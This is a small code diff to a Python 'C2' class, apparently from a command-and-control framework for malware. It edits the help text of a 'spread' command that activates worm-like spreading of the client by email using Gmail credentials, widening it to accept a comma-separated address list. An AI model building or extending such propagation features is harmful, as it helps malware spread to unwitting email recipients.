@@ -366,7 +366,7 @@ class C2():
             'spread': {
                 'method': 'you must first connect to a session to use this command',
                 'description': 'activate worm-like behavior and begin spreading client via email',
-                'usage': 'spread <gmail> <password> <URL email list>'},
+                'usage': 'spread <gmail> <password> <URL email list or comma separated email list>'},
             'stop': {
                 'method': 'you must first connect to a session to use this command',
                 'description': 'stop a running job', 
